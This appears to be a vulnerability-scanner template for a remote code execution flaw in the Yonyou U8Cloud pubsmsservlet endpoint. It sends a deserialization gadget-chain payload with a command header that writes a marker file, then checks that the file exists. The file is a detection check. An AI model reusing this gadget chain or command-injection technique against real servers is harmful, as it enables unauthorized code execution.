id: yongyouU8-Cloud-pubsmsservlet-RCE-QVD-2025-39606

info:
  name: 用友U8Cloud pubsmsservlet 远程代码执行漏洞(QVD-2025-39606)
  author: yongyouU8
  severity: high
  tags: RCE

variables:
  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列

http:
  - raw:
      - |
        POST /servlet/pubsmsservlet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml
        Cmd: echo sectestsectest >./webapps/u8c_web/{{username}}.txt

        <map>
          <entry>
            <org.springframework.aop.target.HotSwappableTargetSource>
              <target class="com.fasterxml.jackson.databind.node.POJONode">
                <__value class="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl" serialization="custom">
                  <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
                    <default>
                      <__name>463a4517-03ad-466f-a7bc-89ccddce0203</__name>
                      <__bytecodes>
                        <byte-array></byte-array>
                      </__bytecodes>
                      <__transletIndex>-1</__transletIndex>
                      <__indentNumber>0</__indentNumber>
                    </default>
                    <boolean>false</boolean>
                  </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
                </__value>
              </target>
            </org.springframework.aop.target.HotSwappableTargetSource>
            <org.springframework.aop.target.HotSwappableTargetSource reference="../org.springframework.aop.target.HotSwappableTargetSource"/>
          </entry>
          <entry>
            <org.springframework.aop.target.HotSwappableTargetSource>
              <target class="org.apache.xpath.objects.XString">
                <m__obj class="string"></m__obj>
              </target>
            </org.springframework.aop.target.HotSwappableTargetSource>
            <org.springframework.aop.target.HotSwappableTargetSource reference="../org.springframework.aop.target.HotSwappableTargetSource"/>
          </entry>
        </map>
      - |
        GET /{{username}}.txt HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'sectestsectest'
      - type: status
        status: 
          - 200